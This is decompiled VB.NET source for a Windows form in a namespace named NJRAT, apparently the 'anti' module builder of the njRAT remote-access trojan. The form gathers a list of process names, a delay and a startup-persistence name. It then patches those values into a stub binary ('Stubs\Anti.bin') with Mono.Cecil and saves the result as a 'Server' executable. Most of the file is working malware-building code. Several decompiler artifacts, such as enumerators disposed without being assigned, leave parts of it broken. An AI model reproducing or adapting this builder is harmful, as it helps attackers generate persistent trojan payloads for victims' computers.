Imports System
Imports System.Collections
Imports System.Collections.Generic
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.IO
Imports System.Runtime.CompilerServices
Imports System.Windows.Forms
Imports Microsoft.VisualBasic
Imports Microsoft.VisualBasic.CompilerServices
Imports Mono.Cecil
Imports Mono.Cecil.Cil
Imports Mono.Collections.Generic

Namespace NJRAT
	' Token: 0x02000009 RID: 9
	<DesignerGenerated()>
	Public Partial Class anti
		Inherits Form

		' Token: 0x06000072 RID: 114 RVA: 0x000025FE File Offset: 0x000007FE
		<DebuggerNonUserCode()>
		Public Sub New()
			AddHandler MyBase.MouseDown, AddressOf Me.Form1_MouseDown
			AddHandler MyBase.MouseMove, AddressOf Me.Form1_MouseMove
			anti.__ENCAddToList(Me)
			Me.InitializeComponent()
		End Sub

		' Token: 0x06000073 RID: 115 RVA: 0x00004FC4 File Offset: 0x000031C4
		<DebuggerNonUserCode()>
		Private Shared Sub __ENCAddToList(value As Object)
			Dim _ENCList As List(Of WeakReference) = anti.__ENCList
			SyncLock _ENCList
				If anti.__ENCList.Count = anti.__ENCList.Capacity Then
					Dim num As Integer = 0
					Dim num2 As Integer = 0
					Dim num3 As Integer = anti.__ENCList.Count - 1
					Dim num4 As Integer = num2
					While True
						Dim num5 As Integer = num4
						Dim num6 As Integer = num3
						If num5 > num6 Then
							Exit For
						End If
						Dim weakReference As WeakReference = anti.__ENCList(num4)
						If weakReference.IsAlive Then
							If num4 <> num Then
								anti.__ENCList(num) = anti.__ENCList(num4)
							End If
							num += 1
						End If
						num4 += 1
					End While
					anti.__ENCList.RemoveRange(num, anti.__ENCList.Count - num)
					anti.__ENCList.Capacity = anti.__ENCList.Count
				End If
				anti.__ENCList.Add(New WeakReference(RuntimeHelpers.GetObjectValue(value)))
			End SyncLock
		End Sub

		' Token: 0x1700002E RID: 46
		' (get) Token: 0x06000076 RID: 118 RVA: 0x00006268 File Offset: 0x00004468
		' (set) Token: 0x06000077 RID: 119 RVA: 0x00002638 File Offset: 0x00000838
		Friend Overridable Property GroupBox1 As GroupBox
			<DebuggerNonUserCode()>
			Get
				Return Me._GroupBox1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As GroupBox)
				Me._GroupBox1 = value
			End Set
		End Property

		' Token: 0x1700002F RID: 47
		' (get) Token: 0x06000078 RID: 120 RVA: 0x00006280 File Offset: 0x00004480
		' (set) Token: 0x06000079 RID: 121 RVA: 0x00002641 File Offset: 0x00000841
		Friend Overridable Property LVProcess As ListView
			<DebuggerNonUserCode()>
			Get
				Return Me._LVProcess
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ListView)
				Me._LVProcess = value
			End Set
		End Property

		' Token: 0x17000030 RID: 48
		' (get) Token: 0x0600007A RID: 122 RVA: 0x00006298 File Offset: 0x00004498
		' (set) Token: 0x0600007B RID: 123 RVA: 0x0000264A File Offset: 0x0000084A
		Friend Overridable Property ColumnHeader1 As ColumnHeader
			<DebuggerNonUserCode()>
			Get
				Return Me._ColumnHeader1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ColumnHeader)
				Me._ColumnHeader1 = value
			End Set
		End Property

		' Token: 0x17000031 RID: 49
		' (get) Token: 0x0600007C RID: 124 RVA: 0x000062B0 File Offset: 0x000044B0
		' (set) Token: 0x0600007D RID: 125 RVA: 0x00002653 File Offset: 0x00000853
		Friend Overridable Property Label1 As Label
			<DebuggerNonUserCode()>
			Get
				Return Me._Label1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Label)
				Me._Label1 = value
			End Set
		End Property

		' Token: 0x17000032 RID: 50
		' (get) Token: 0x0600007E RID: 126 RVA: 0x000062C8 File Offset: 0x000044C8
		' (set) Token: 0x0600007F RID: 127 RVA: 0x000062E0 File Offset: 0x000044E0
		Friend Overridable Property txtNomeProcess As TextBox
			<DebuggerNonUserCode()>
			Get
				Return Me._txtNomeProcess
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As TextBox)
				Dim value2 As KeyEventHandler = AddressOf Me.txtNomeProcess_KeyDown
				If Me._txtNomeProcess IsNot Nothing Then
					RemoveHandler Me._txtNomeProcess.KeyDown, value2
				End If
				Me._txtNomeProcess = value
				If Me._txtNomeProcess IsNot Nothing Then
					AddHandler Me._txtNomeProcess.KeyDown, value2
				End If
			End Set
		End Property

		' Token: 0x17000033 RID: 51
		' (get) Token: 0x06000080 RID: 128 RVA: 0x00006338 File Offset: 0x00004538
		' (set) Token: 0x06000081 RID: 129 RVA: 0x00006350 File Offset: 0x00004550
		Friend Overridable Property btnAdicionar As Button
			<DebuggerNonUserCode()>
			Get
				Return Me._btnAdicionar
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Button)
				Dim value2 As EventHandler = AddressOf Me.btnAdicionar_Click
				If Me._btnAdicionar IsNot Nothing Then
					RemoveHandler Me._btnAdicionar.Click, value2
				End If
				Me._btnAdicionar = value
				If Me._btnAdicionar IsNot Nothing Then
					AddHandler Me._btnAdicionar.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000034 RID: 52
		' (get) Token: 0x06000082 RID: 130 RVA: 0x000063A8 File Offset: 0x000045A8
		' (set) Token: 0x06000083 RID: 131 RVA: 0x000063C0 File Offset: 0x000045C0
		Friend Overridable Property CKAtivarStartUp As CheckBox
			<DebuggerNonUserCode()>
			Get
				Return Me._CKAtivarStartUp
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As CheckBox)
				Dim value2 As EventHandler = AddressOf Me.CKAtivarStartUp_CheckedChanged
				If Me._CKAtivarStartUp IsNot Nothing Then
					RemoveHandler Me._CKAtivarStartUp.CheckedChanged, value2
				End If
				Me._CKAtivarStartUp = value
				If Me._CKAtivarStartUp IsNot Nothing Then
					AddHandler Me._CKAtivarStartUp.CheckedChanged, value2
				End If
			End Set
		End Property

		' Token: 0x17000035 RID: 53
		' (get) Token: 0x06000084 RID: 132 RVA: 0x00006418 File Offset: 0x00004618
		' (set) Token: 0x06000085 RID: 133 RVA: 0x00006430 File Offset: 0x00004630
		Friend Overridable Property btnAtualizar As Button
			<DebuggerNonUserCode()>
			Get
				Return Me._btnAtualizar
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Button)
				Dim value2 As EventHandler = AddressOf Me.btnAtualizar_Click
				If Me._btnAtualizar IsNot Nothing Then
					RemoveHandler Me._btnAtualizar.Click, value2
				End If
				Me._btnAtualizar = value
				If Me._btnAtualizar IsNot Nothing Then
					AddHandler Me._btnAtualizar.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000036 RID: 54
		' (get) Token: 0x06000086 RID: 134 RVA: 0x00006488 File Offset: 0x00004688
		' (set) Token: 0x06000087 RID: 135 RVA: 0x0000265C File Offset: 0x0000085C
		Friend Overridable Property LVListProcess As ListView
			<DebuggerNonUserCode()>
			Get
				Return Me._LVListProcess
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ListView)
				Me._LVListProcess = value
			End Set
		End Property

		' Token: 0x17000037 RID: 55
		' (get) Token: 0x06000088 RID: 136 RVA: 0x000064A0 File Offset: 0x000046A0
		' (set) Token: 0x06000089 RID: 137 RVA: 0x00002665 File Offset: 0x00000865
		Friend Overridable Property ColumnHeader2 As ColumnHeader
			<DebuggerNonUserCode()>
			Get
				Return Me._ColumnHeader2
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ColumnHeader)
				Me._ColumnHeader2 = value
			End Set
		End Property

		' Token: 0x17000038 RID: 56
		' (get) Token: 0x0600008A RID: 138 RVA: 0x000064B8 File Offset: 0x000046B8
		' (set) Token: 0x0600008B RID: 139 RVA: 0x000064D0 File Offset: 0x000046D0
		Friend Overridable Property btnCriar As Button
			<DebuggerNonUserCode()>
			Get
				Return Me._btnCriar
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Button)
				Dim value2 As EventHandler = AddressOf Me.btnCriar_Click
				If Me._btnCriar IsNot Nothing Then
					RemoveHandler Me._btnCriar.Click, value2
				End If
				Me._btnCriar = value
				If Me._btnCriar IsNot Nothing Then
					AddHandler Me._btnCriar.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000039 RID: 57
		' (get) Token: 0x0600008C RID: 140 RVA: 0x00006528 File Offset: 0x00004728
		' (set) Token: 0x0600008D RID: 141 RVA: 0x0000266E File Offset: 0x0000086E
		Friend Overridable Property IM As ImageList
			<DebuggerNonUserCode()>
			Get
				Return Me._IM
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ImageList)
				Me._IM = value
			End Set
		End Property

		' Token: 0x1700003A RID: 58
		' (get) Token: 0x0600008E RID: 142 RVA: 0x00006540 File Offset: 0x00004740
		' (set) Token: 0x0600008F RID: 143 RVA: 0x00002677 File Offset: 0x00000877
		Friend Overridable Property CM As ContextMenuStrip
			<DebuggerNonUserCode()>
			Get
				Return Me._CM
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ContextMenuStrip)
				Me._CM = value
			End Set
		End Property

		' Token: 0x1700003B RID: 59
		' (get) Token: 0x06000090 RID: 144 RVA: 0x00006558 File Offset: 0x00004758
		' (set) Token: 0x06000091 RID: 145 RVA: 0x00006570 File Offset: 0x00004770
		Friend Overridable Property AdicionarToolStripMenuItem As ToolStripMenuItem
			<DebuggerNonUserCode()>
			Get
				Return Me._AdicionarToolStripMenuItem
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.AdicionarToolStripMenuItem_Click
				If Me._AdicionarToolStripMenuItem IsNot Nothing Then
					RemoveHandler Me._AdicionarToolStripMenuItem.Click, value2
				End If
				Me._AdicionarToolStripMenuItem = value
				If Me._AdicionarToolStripMenuItem IsNot Nothing Then
					AddHandler Me._AdicionarToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x1700003C RID: 60
		' (get) Token: 0x06000092 RID: 146 RVA: 0x000065C8 File Offset: 0x000047C8
		' (set) Token: 0x06000093 RID: 147 RVA: 0x00002680 File Offset: 0x00000880
		Friend Overridable Property CM1 As ContextMenuStrip
			<DebuggerNonUserCode()>
			Get
				Return Me._CM1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ContextMenuStrip)
				Me._CM1 = value
			End Set
		End Property

		' Token: 0x1700003D RID: 61
		' (get) Token: 0x06000094 RID: 148 RVA: 0x000065E0 File Offset: 0x000047E0
		' (set) Token: 0x06000095 RID: 149 RVA: 0x000065F8 File Offset: 0x000047F8
		Friend Overridable Property ExcluirToolStripMenuItem As ToolStripMenuItem
			<DebuggerNonUserCode()>
			Get
				Return Me._ExcluirToolStripMenuItem
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.ExcluirToolStripMenuItem_Click
				If Me._ExcluirToolStripMenuItem IsNot Nothing Then
					RemoveHandler Me._ExcluirToolStripMenuItem.Click, value2
				End If
				Me._ExcluirToolStripMenuItem = value
				If Me._ExcluirToolStripMenuItem IsNot Nothing Then
					AddHandler Me._ExcluirToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x1700003E RID: 62
		' (get) Token: 0x06000096 RID: 150 RVA: 0x00006650 File Offset: 0x00004850
		' (set) Token: 0x06000097 RID: 151 RVA: 0x00002689 File Offset: 0x00000889
		Friend Overridable Property txtNomeStartUp As TextBox
			<DebuggerNonUserCode()>
			Get
				Return Me._txtNomeStartUp
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As TextBox)
				Me._txtNomeStartUp = value
			End Set
		End Property

		' Token: 0x1700003F RID: 63
		' (get) Token: 0x06000098 RID: 152 RVA: 0x00006668 File Offset: 0x00004868
		' (set) Token: 0x06000099 RID: 153 RVA: 0x00002692 File Offset: 0x00000892
		Friend Overridable Property NDDelay As NumericUpDown
			<DebuggerNonUserCode()>
			Get
				Return Me._NDDelay
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As NumericUpDown)
				Me._NDDelay = value
			End Set
		End Property

		' Token: 0x17000040 RID: 64
		' (get) Token: 0x0600009A RID: 154 RVA: 0x00006680 File Offset: 0x00004880
		' (set) Token: 0x0600009B RID: 155 RVA: 0x0000269B File Offset: 0x0000089B
		Friend Overridable Property Label2 As Label
			<DebuggerNonUserCode()>
			Get
				Return Me._Label2
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Label)
				Me._Label2 = value
			End Set
		End Property

		' Token: 0x17000041 RID: 65
		' (get) Token: 0x0600009C RID: 156 RVA: 0x00006698 File Offset: 0x00004898
		' (set) Token: 0x0600009D RID: 157 RVA: 0x000026A4 File Offset: 0x000008A4
		Friend Overridable Property Label3 As Label
			<DebuggerNonUserCode()>
			Get
				Return Me._Label3
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Label)
				Me._Label3 = value
			End Set
		End Property

		' Token: 0x17000042 RID: 66
		' (get) Token: 0x0600009E RID: 158 RVA: 0x000066B0 File Offset: 0x000048B0
		' (set) Token: 0x0600009F RID: 159 RVA: 0x000026AD File Offset: 0x000008AD
		Friend Overridable Property Label4 As Label
			<DebuggerNonUserCode()>
			Get
				Return Me._Label4
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Label)
				Me._Label4 = value
			End Set
		End Property

		' Token: 0x17000043 RID: 67
		' (get) Token: 0x060000A0 RID: 160 RVA: 0x000066C8 File Offset: 0x000048C8
		' (set) Token: 0x060000A1 RID: 161 RVA: 0x000026B6 File Offset: 0x000008B6
		Friend Overridable Property Label5 As Label
			<DebuggerNonUserCode()>
			Get
				Return Me._Label5
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Label)
				Me._Label5 = value
			End Set
		End Property

		' Token: 0x17000044 RID: 68
		' (get) Token: 0x060000A2 RID: 162 RVA: 0x000066E0 File Offset: 0x000048E0
		' (set) Token: 0x060000A3 RID: 163 RVA: 0x000066F8 File Offset: 0x000048F8
		Friend Overridable Property Button2 As Button
			<DebuggerNonUserCode()>
			Get
				Return Me._Button2
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Button)
				Dim value2 As EventHandler = AddressOf Me.Button2_Click
				If Me._Button2 IsNot Nothing Then
					RemoveHandler Me._Button2.Click, value2
				End If
				Me._Button2 = value
				If Me._Button2 IsNot Nothing Then
					AddHandler Me._Button2.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000045 RID: 69
		' (get) Token: 0x060000A4 RID: 164 RVA: 0x00006750 File Offset: 0x00004950
		' (set) Token: 0x060000A5 RID: 165 RVA: 0x00006768 File Offset: 0x00004968
		Friend Overridable Property Button1 As Button
			<DebuggerNonUserCode()>
			Get
				Return Me._Button1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Button)
				Dim value2 As EventHandler = AddressOf Me.Button1_Click
				If Me._Button1 IsNot Nothing Then
					RemoveHandler Me._Button1.Click, value2
				End If
				Me._Button1 = value
				If Me._Button1 IsNot Nothing Then
					AddHandler Me._Button1.Click, value2
				End If
			End Set
		End Property

		' Token: 0x060000A6 RID: 166 RVA: 0x000026BF File Offset: 0x000008BF
		Private Sub btnAtualizar_Click(sender As Object, e As EventArgs)
			Me.MeusProcessos()
		End Sub

		' Token: 0x060000A7 RID: 167 RVA: 0x000067C0 File Offset: 0x000049C0
		Private Sub MeusProcessos()
			Try
				Me.LVListProcess.Items.Clear()
				Me.LVListProcess.Sorting = SortOrder.None
				For Each process As Process In Process.GetProcesses()
					Try
						Dim id As Integer = process.Id
						Dim icon As Icon = Icon.ExtractAssociatedIcon(process.MainModule.FileName)
						Me.IM.Images.Add(id.ToString(), icon)
						Dim listViewItem As ListViewItem = New ListViewItem()
						listViewItem.Text = process.ProcessName
						listViewItem.ImageKey = id.ToString()
						Me.LVListProcess.Items.Add(listViewItem)
						Me.LVListProcess.Columns(0).Text = "Process List (" + Conversions.ToString(Me.LVListProcess.Items.Count) + ")"
					Catch ex As Exception
					End Try
				Next
				Me.LVListProcess.Sorting = SortOrder.Ascending
			Catch ex2 As Exception
			End Try
		End Sub

		' Token: 0x060000A8 RID: 168 RVA: 0x000068F4 File Offset: 0x00004AF4
		Private Sub AdicionarToolStripMenuItem_Click(sender As Object, e As EventArgs)
			Try
				Try
					For Each obj As Object In Me.LVListProcess.SelectedItems
						Dim listViewItem As ListViewItem = CType(obj, ListViewItem)
						Dim listViewItem2 As ListViewItem = New ListViewItem()
						listViewItem2.Text = listViewItem.Text
						listViewItem2.ImageKey = listViewItem.ImageKey
						Me.LVProcess.Items.Add(listViewItem2)
						Me.LVListProcess.Items.RemoveAt(listViewItem.Index)
						Me.LVListProcess.Columns(0).Text = "Process List (" + Conversions.ToString(Me.LVListProcess.Items.Count) + ")"
						Me.LVProcess.Columns(0).Text = "Process (" + Conversions.ToString(Me.LVProcess.Items.Count) + ")"
					Next
				Finally
					Dim enumerator As IEnumerator
					If TypeOf enumerator Is IDisposable Then
						TryCast(enumerator, IDisposable).Dispose()
					End If
				End Try
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x060000A9 RID: 169 RVA: 0x00006A4C File Offset: 0x00004C4C
		Private Sub ExcluirToolStripMenuItem_Click(sender As Object, e As EventArgs)
			Try
				For Each obj As Object In Me.LVProcess.SelectedItems
					Dim listViewItem As ListViewItem = CType(obj, ListViewItem)
					Me.LVProcess.Items.RemoveAt(listViewItem.Index)
					Me.LVProcess.Columns(0).Text = "Process (" + Conversions.ToString(Me.LVProcess.Items.Count) + ")"
				Next
			Finally
				Dim enumerator As IEnumerator
				If TypeOf enumerator Is IDisposable Then
					TryCast(enumerator, IDisposable).Dispose()
				End If
			End Try
		End Sub

		' Token: 0x060000AA RID: 170 RVA: 0x00006B00 File Offset: 0x00004D00
		Private Sub btnAdicionar_Click(sender As Object, e As EventArgs)
			If Operators.CompareString(Me.txtNomeProcess.Text, Nothing, False) = 0 Then
				Interaction.MsgBox("INSERT NAME OF PROCESS", MsgBoxStyle.Exclamation, "Information")
			Else
				Dim listViewItem As ListViewItem = New ListViewItem()
				listViewItem.Text = Me.txtNomeProcess.Text
				listViewItem.ImageIndex = 0
				Me.LVProcess.Items.Add(listViewItem)
				Me.txtNomeProcess.Text = Nothing
				Me.LVProcess.Columns(0).Text = "Process (" + Conversions.ToString(Me.LVProcess.Items.Count) + ")"
			End If
		End Sub

		' Token: 0x060000AB RID: 171 RVA: 0x000026C7 File Offset: 0x000008C7
		Private Sub txtNomeProcess_KeyDown(sender As Object, e As KeyEventArgs)
			If e.KeyCode = Keys.[Return] Then
				Me.btnAdicionar.PerformClick()
			End If
		End Sub

		' Token: 0x060000AC RID: 172 RVA: 0x00006BB0 File Offset: 0x00004DB0
		Private Sub btnCriar_Click(sender As Object, e As EventArgs)
			Application.DoEvents()
			If Not File.Exists(Application.StartupPath + "\Stubs\Anti.bin") Then
				Interaction.MsgBox("'MemoryDiagnostic' NOT FOUND", MsgBoxStyle.Critical, "Information")
			ElseIf Me.LVProcess.Items.Count = 0 Then
				Interaction.MsgBox("ADD YOUR LIST OF PROCESS FOR GENERATING", MsgBoxStyle.Exclamation, "Information")
			ElseIf Me.CKAtivarStartUp.Checked And Operators.CompareString(Me.txtNomeStartUp.Text, Nothing, False) = 0 Then
				Interaction.MsgBox("INSERT FILE NAME (StartUp)", MsgBoxStyle.Exclamation, "Information")
			Else
				Dim saveFileDialog As SaveFileDialog = New SaveFileDialog()
				saveFileDialog.Title = "Server"
				saveFileDialog.Filter = "File (*.exe)|*.exe"
				saveFileDialog.FileName = DateAndTime.TimeOfDay.ToString("ssmmhh MMddyyyy").Replace(" ", "")
				If saveFileDialog.ShowDialog() = DialogResult.OK Then
					Try
						Dim assemblyDefinition As AssemblyDefinition = AssemblyDefinition.ReadAssembly(Application.StartupPath + "\Stubs\Anti.bin")
						Try
							For Each typeDefinition As TypeDefinition In assemblyDefinition.MainModule.GetTypes()
								Try
									For Each methodDefinition As MethodDefinition In typeDefinition.Methods
										If Operators.CompareString(methodDefinition.Name, ".cctor", False) = 0 Then
											Dim enumerator3 As IEnumerator(Of Instruction) = Nothing
											Try
												enumerator3 = CType(methodDefinition.Body.Instructions.GetEnumerator(), IEnumerator(Of Instruction))
												While enumerator3.MoveNext()
													Dim instruction As Instruction = enumerator3.Current
													If instruction.OpCode.Code = Code.Ldstr Then
														Dim left As String = instruction.Operand.ToString()
														If Operators.CompareString(left, "%MinhaLiistaas%", False) = 0 Then
															Dim text As String = String.Empty
															Dim num As Integer = 0
															Try
																For Each obj As Object In Me.LVProcess.Items
																	Dim listViewItem As ListViewItem = CType(obj, ListViewItem)
																	text = text + Me.LVProcess.Items(num).SubItems(0).Text + ","
																	num += 1
																Next
															Finally
																Dim enumerator4 As IEnumerator
																If TypeOf enumerator4 Is IDisposable Then
																	TryCast(enumerator4, IDisposable).Dispose()
																End If
															End Try
															instruction.Operand = text
														ElseIf Operators.CompareString(left, "%MinhaDelayy%", False) = 0 Then
															instruction.Operand = Me.NDDelay.Value.ToString()
														ElseIf Operators.CompareString(left, "%AtivarStartUpp%", False) = 0 Then
															instruction.Operand = Me.CKAtivarStartUp.Checked.ToString()
														ElseIf Operators.CompareString(left, "%NomeStartUpp%", False) = 0 Then
															instruction.Operand = Me.txtNomeStartUp.Text
														End If
													End If
												End While
											Finally
												enumerator3.Dispose()
											End Try
										End If
									Next
								Finally
									Dim enumerator2 As Collection(Of MethodDefinition).Enumerator
									CType(enumerator2, IDisposable).Dispose()
								End Try
							Next
						Finally
							Dim enumerator As IEnumerator(Of TypeDefinition)
							If enumerator IsNot Nothing Then
								enumerator.Dispose()
							End If
						End Try
						assemblyDefinition.Write(saveFileDialog.FileName)
						Interaction.MsgBox(saveFileDialog.FileName + " ✅", MsgBoxStyle.Information, "Information")
					Catch ex As Exception
						Interaction.MsgBox("ERROR: AN ERROR OCCURRED TO CREATE THE SERVER TRY AGAIN", MsgBoxStyle.Critical, "Windows")
					End Try
				End If
			End If
		End Sub

		' Token: 0x060000AD RID: 173 RVA: 0x000026E0 File Offset: 0x000008E0
		Private Sub Form1_MouseDown(sender As Object, e As MouseEventArgs)
			If e.Button = MouseButtons.Left Then
				Me.Pont = e.Location
			End If
		End Sub

		' Token: 0x060000AE RID: 174 RVA: 0x000026FD File Offset: 0x000008FD
		Private Sub Form1_MouseMove(sender As Object, e As MouseEventArgs)
			If e.Button = MouseButtons.Left Then
				Me.Location += CType((e.Location - CType(Me.Pont, Size)), Size)
			End If
		End Sub

		' Token: 0x060000AF RID: 175 RVA: 0x0000273A File Offset: 0x0000093A
		Private Sub CKAtivarStartUp_CheckedChanged(sender As Object, e As EventArgs)
			If Me.CKAtivarStartUp.Checked Then
				Me.txtNomeStartUp.Enabled = True
			Else
				Me.txtNomeStartUp.Enabled = False
			End If
		End Sub

		' Token: 0x060000B0 RID: 176 RVA: 0x00002763 File Offset: 0x00000963
		Private Sub Button2_Click(sender As Object, e As EventArgs)
			Me.WindowState = FormWindowState.Minimized
		End Sub

		' Token: 0x060000B1 RID: 177 RVA: 0x0000276C File Offset: 0x0000096C
		Private Sub Button1_Click(sender As Object, e As EventArgs)
			Me.Close()
		End Sub

		' Token: 0x04000032 RID: 50
		Private Shared __ENCList As List(Of WeakReference) = New List(Of WeakReference)()

		' Token: 0x04000034 RID: 52
		<AccessedThroughProperty("GroupBox1")>
		Private _GroupBox1 As GroupBox

		' Token: 0x04000035 RID: 53
		<AccessedThroughProperty("LVProcess")>
		Private _LVProcess As ListView

		' Token: 0x04000036 RID: 54
		<AccessedThroughProperty("ColumnHeader1")>
		Private _ColumnHeader1 As ColumnHeader

		' Token: 0x04000037 RID: 55
		<AccessedThroughProperty("Label1")>
		Private _Label1 As Label

		' Token: 0x04000038 RID: 56
		<AccessedThroughProperty("txtNomeProcess")>
		Private _txtNomeProcess As TextBox

		' Token: 0x04000039 RID: 57
		<AccessedThroughProperty("btnAdicionar")>
		Private _btnAdicionar As Button

		' Token: 0x0400003A RID: 58
		<AccessedThroughProperty("CKAtivarStartUp")>
		Private _CKAtivarStartUp As CheckBox

		' Token: 0x0400003B RID: 59
		<AccessedThroughProperty("btnAtualizar")>
		Private _btnAtualizar As Button

		' Token: 0x0400003C RID: 60
		<AccessedThroughProperty("LVListProcess")>
		Private _LVListProcess As ListView

		' Token: 0x0400003D RID: 61
		<AccessedThroughProperty("ColumnHeader2")>
		Private _ColumnHeader2 As ColumnHeader

		' Token: 0x0400003E RID: 62
		<AccessedThroughProperty("btnCriar")>
		Private _btnCriar As Button

		' Token: 0x0400003F RID: 63
		<AccessedThroughProperty("IM")>
		Private _IM As ImageList

		' Token: 0x04000040 RID: 64
		<AccessedThroughProperty("CM")>
		Private _CM As ContextMenuStrip

		' Token: 0x04000041 RID: 65
		<AccessedThroughProperty("AdicionarToolStripMenuItem")>
		Private _AdicionarToolStripMenuItem As ToolStripMenuItem

		' Token: 0x04000042 RID: 66
		<AccessedThroughProperty("CM1")>
		Private _CM1 As ContextMenuStrip

		' Token: 0x04000043 RID: 67
		<AccessedThroughProperty("ExcluirToolStripMenuItem")>
		Private _ExcluirToolStripMenuItem As ToolStripMenuItem

		' Token: 0x04000044 RID: 68
		<AccessedThroughProperty("txtNomeStartUp")>
		Private _txtNomeStartUp As TextBox

		' Token: 0x04000045 RID: 69
		<AccessedThroughProperty("NDDelay")>
		Private _NDDelay As NumericUpDown

		' Token: 0x04000046 RID: 70
		<AccessedThroughProperty("Label2")>
		Private _Label2 As Label

		' Token: 0x04000047 RID: 71
		<AccessedThroughProperty("Label3")>
		Private _Label3 As Label

		' Token: 0x04000048 RID: 72
		<AccessedThroughProperty("Label4")>
		Private _Label4 As Label

		' Token: 0x04000049 RID: 73
		<AccessedThroughProperty("Label5")>
		Private _Label5 As Label

		' Token: 0x0400004A RID: 74
		<AccessedThroughProperty("Button2")>
		Private _Button2 As Button

		' Token: 0x0400004B RID: 75
		<AccessedThroughProperty("Button1")>
		Private _Button1 As Button

		' Token: 0x0400004C RID: 76
		Public Pont As Point
	End Class
End Namespace
